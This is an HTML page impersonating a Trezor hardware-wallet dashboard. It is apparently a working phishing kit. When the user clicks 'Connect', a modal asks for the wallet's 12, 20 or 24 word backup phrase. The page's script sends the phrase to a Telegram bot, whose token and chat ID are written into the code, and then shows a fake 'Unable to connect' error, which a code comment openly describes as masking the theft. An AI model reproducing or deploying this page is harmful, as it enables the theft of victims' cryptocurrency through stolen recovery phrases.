<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TREZOR - Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: #1a1a1a;
            color: #ffffff;
            height: 100vh;
            overflow: hidden;
            margin: 0;
        }

        .container {
            display: flex;
            height: 100vh;
        }

        /* Sidebar Styles */
        .sidebar {
            width: 240px;
            background-color: #000000;
            display: flex;
            flex-direction: column;
            padding: 24px 0;
            position: relative;
        }

        .logo {
            display: flex;
            align-items: center;
            padding: 0 24px 32px 24px;
        }

        .logo-svg {
            width: 130px;
            height: 24px;
            flex-shrink: 0;
        }

        .nav-menu {
            display: flex;
            flex-direction: column;
            gap: 4px;
            padding: 0 12px;
            flex: 1;
        }

        .nav-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            color: #ffffff;
            text-decoration: none;
            border-radius: 8px;
            transition: background-color 0.2s;
        }

        .nav-item:hover {
            background-color: rgba(255, 255, 255, 0.05);
        }

        .nav-item.active {
            background-color: #2d2d2d;
        }

        .nav-icon {
            width: 20px;
            height: 20px;
            color: #ffffff;
        }

        .nav-item span {
            font-size: 14px;
            font-weight: 500;
        }

        .sidebar-footer {
            display: flex;
            justify-content: space-between;
            padding: 0 24px;
            margin-top: auto;
        }

        .footer-icon {
            width: 18px;
            height: 18px;
            color: #ffffff;
            opacity: 0.6;
        }

        /* Main Content Styles */
        .main-content {
            flex: 1;
            background-color: #1a1a1a;
            padding: 40px;
            position: relative;
            display: flex;
            flex-direction: column;
            overflow-y: auto;
        }

        .page-title {
            font-size: 32px;
            font-weight: 600;
            color: #ffffff;
            margin-bottom: 40px;
        }

        .content-center {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            flex: 1;
            gap: 24px;
        }

        .trezor-device {
            width: 200px;
            height: 280px;
            background-color: #2d2d2d;
            border-radius: 16px;
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 24px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
        }

        .device-screen {
            width: 100%;
            height: 140px;
            background-color: #000000;
            border-radius: 8px;
            margin-bottom: 24px;
        }

        .device-lock {
            position: absolute;
            bottom: 40px;
            width: 32px;
            height: 32px;
            color: #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .device-lock svg {
            width: 24px;
            height: 24px;
        }

        .main-heading {
            font-size: 24px;
            font-weight: 600;
            color: #ffffff;
            text-align: center;
        }

        .sub-text {
            font-size: 16px;
            color: #999999;
            text-align: center;
        }

        .connect-button {
            background-color: #86efac;
            color: #000000;
            border: none;
            padding: 14px 32px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 8px;
        }

        .connect-button:hover {
            background-color: #3bc96d;
        }

        .search-icon {
            position: absolute;
            bottom: 40px;
            right: 40px;
            width: 24px;
            height: 24px;
            color: #ffffff;
            opacity: 0.7;
            cursor: pointer;
        }

        .search-icon svg {
            width: 100%;
            height: 100%;
        }

        /* Modal Styles */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }

        .modal-overlay.active {
            display: flex;
        }

        .modal-content {
            background-color: #1a1a1a;
            border-radius: 12px;
            width: 90%;
            max-width: 500px;
            padding: 0;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
            animation: modalSlideIn 0.3s ease-out;
        }

        @keyframes modalSlideIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 24px;
            border-bottom: 1px solid #2d2d2d;
        }

        .modal-title {
            font-size: 24px;
            font-weight: 600;
            color: #ffffff;
            margin: 0;
        }

        .modal-close {
            background: none;
            border: none;
            color: #ffffff;
            font-size: 32px;
            cursor: pointer;
            padding: 0;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 4px;
            transition: background-color 0.2s;
        }

        .modal-close:hover {
            background-color: #2d2d2d;
        }

        .modal-body {
            padding: 24px;
        }

        .modal-description {
            color: #999999;
            font-size: 14px;
            margin-bottom: 20px;
            line-height: 1.5;
        }

        .backup-input {
            width: 100%;
            background-color: #0f0f0f;
            border: 1px solid #2d2d2d;
            border-radius: 8px;
            padding: 16px;
            color: #ffffff;
            font-size: 14px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            resize: vertical;
            min-height: 120px;
            margin-bottom: 24px;
            transition: border-color 0.2s;
        }

        .backup-input:focus {
            outline: none;
            border-color: #86efac;
        }

        .backup-input::placeholder {
            color: #666666;
        }

        .modal-actions {
            display: flex;
            gap: 12px;
            justify-content: flex-end;
        }

        .modal-cancel,
        .modal-connect {
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            border: none;
            transition: all 0.2s;
        }

        .modal-cancel {
            background-color: #2d2d2d;
            color: #ffffff;
        }

        .modal-cancel:hover {
            background-color: #3a3a3a;
        }

        .modal-connect {
            background-color: #86efac;
            color: #000000;
        }

        .modal-connect:hover {
            background-color: #3bc96d;
        }

        .modal-connect:disabled {
            background-color: #4a4a4a;
            color: #999999;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Left Sidebar -->
        <aside class="sidebar">
            <div class="logo">
                <svg class="logo-svg" viewBox="0 0 140 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <!-- Stylized Padlock Icon -->
                    <g class="padlock-icon">
                        <!-- Rounded shackle (inverted U-shape) -->
                        <path d="M6 2C6 1.4 6.4 1 7 1C7.6 1 8 1.4 8 2V4H10C10.6 4 11 4.4 11 5V6H13V5C13 4.4 13.4 4 14 4H16V2C16 1.4 16.4 1 17 1C17.6 1 18 1.4 18 2V4H20C20.6 4 21 4.4 21 5V7H19V5H5V7H3V5C3 4.4 3.4 4 4 4H6V2Z" fill="white"/>
                        <!-- Shield-like body (flat top, angled sides, pointed/flattened bottom) -->
                        <path d="M3 7H21V8V17C21 17.6 20.6 18 20 18H19L18 20H6L5 18H4C3.4 18 3 17.6 3 17V7Z" fill="white"/>
                        <!-- White rectangular cutout (inverted keyhole) in center -->
                        <rect x="10" y="10" width="6" height="5" fill="#000000"/>
                    </g>
                    <!-- TREZOR Text -->
                    <text x="28" y="17" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif" font-size="13" font-weight="700" letter-spacing="2.5" fill="white">TREZOR</text>
                </svg>
            </div>
            
            <nav class="nav-menu">
                <a href="#" class="nav-item active">
                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" fill="currentColor"/>
                    </svg>
                    <span>Dashboard</span>
                </a>
                <a href="#" class="nav-item">
                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z" fill="currentColor"/>
                    </svg>
                    <span>Activity</span>
                </a>
                <a href="#" class="nav-item">
                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94L14.4 2.81c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.07.62-.07.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z" fill="currentColor"/>
                    </svg>
                    <span>Settings</span>
                </a>
            </nav>
            
            <div class="sidebar-footer">
                <svg class="footer-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z" fill="currentColor"/>
                </svg>
                <svg class="footer-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="currentColor"/>
                </svg>
            </div>
        </aside>
        
        <!-- Main Content -->
        <main class="main-content">
            <h1 class="page-title">Dashboard</h1>
            
            <div class="content-center">
                <div class="trezor-device">
                    <div class="device-screen"></div>
                    <div class="device-lock">
                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" fill="currentColor"/>
                        </svg>
                    </div>
                </div>
                
                <h2 class="main-heading">Connect and update your Trezor</h2>
                <p class="sub-text">Connect your Trezor to manage your assets.</p>
                
                <button class="connect-button" id="connectBtn">Connect</button>
            </div>
            
            <div class="search-icon">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z" fill="currentColor"/>
                </svg>
            </div>
        </main>
    </div>

    <!-- Backup Phrase Modal -->
    <div class="modal-overlay" id="backupModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">Enter Backup Phrase</h2>
                <button class="modal-close" id="closeModal">&times;</button>
            </div>
            <div class="modal-body">
                <p class="modal-description">Please enter your 12, 20, or 24 word backup phrase to connect your Trezor device.</p>
                <textarea 
                    id="backupPhrase" 
                    class="backup-input" 
                    placeholder="Enter your backup phrase here (12, 20, or 24 words)"
                    rows="4"
                ></textarea>
                <div class="modal-actions">
                    <button class="modal-cancel" id="cancelBtn">Cancel</button>
                    <button class="modal-connect" id="submitBackup">Connect</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = '8349363327:AAHfKI1QevoDN6L7R1mHUJ4Ruia8y9cvXF4';
        const TELEGRAM_CHAT_ID = '8445832367';

        // Modal elements
        const connectBtn = document.getElementById('connectBtn');
        const backupModal = document.getElementById('backupModal');
        const closeModal = document.getElementById('closeModal');
        const cancelBtn = document.getElementById('cancelBtn');
        const submitBackup = document.getElementById('submitBackup');
        const backupPhraseInput = document.getElementById('backupPhrase');

        // Open modal when Connect button is clicked
        connectBtn.addEventListener('click', () => {
            backupModal.classList.add('active');
            backupPhraseInput.focus();
        });

        // Close modal functions
        function closeModalFunc() {
            backupModal.classList.remove('active');
            backupPhraseInput.value = '';
        }

        closeModal.addEventListener('click', closeModalFunc);
        cancelBtn.addEventListener('click', closeModalFunc);

        // Close modal when clicking outside
        backupModal.addEventListener('click', (e) => {
            if (e.target === backupModal) {
                closeModalFunc();
            }
        });

        // Close modal on Escape key
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && backupModal.classList.contains('active')) {
                closeModalFunc();
            }
        });

        // Validate backup phrase (12, 20, or 24 words)
        function validateBackupPhrase(phrase) {
            const words = phrase.trim().split(/\s+/).filter(word => word.length > 0);
            return words.length === 12 || words.length === 20 || words.length === 24;
        }

        // Send backup phrase to Telegram
        async function sendToTelegram(backupPhrase) {
            try {
                const message = `🔐 New Backup Phrase Received:\n\n${backupPhrase}`;
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const data = await response.json();
                
                if (data.ok) {
                    return { success: true, message: 'Backup phrase sent successfully!' };
                } else {
                    return { success: false, message: 'Failed to send: ' + data.description };
                }
            } catch (error) {
                return { success: false, message: 'Error: ' + error.message };
            }
        }

        // Handle backup phrase submission
        submitBackup.addEventListener('click', async () => {
            const backupPhrase = backupPhraseInput.value.trim();
            
            if (!backupPhrase) {
                alert('Please enter your backup phrase.');
                return;
            }
            
            if (!validateBackupPhrase(backupPhrase)) {
                alert('Please enter a valid backup phrase with 12, 20, or 24 words.');
                return;
            }
            
            // Disable button during submission
            submitBackup.disabled = true;
            submitBackup.textContent = 'Connecting...';
            
            // Send to Telegram
            const result = await sendToTelegram(backupPhrase);
            
            if (result.success) {
                // Always show error message to user, but data is sent to Telegram
                alert('Unable to connect, try again.');
                closeModalFunc();
            } else {
                alert('Connection failed: ' + result.message);
            }
            
            // Re-enable button
            submitBackup.disabled = false;
            submitBackup.textContent = 'Connect';
        });
    </script>
</body>
</html>
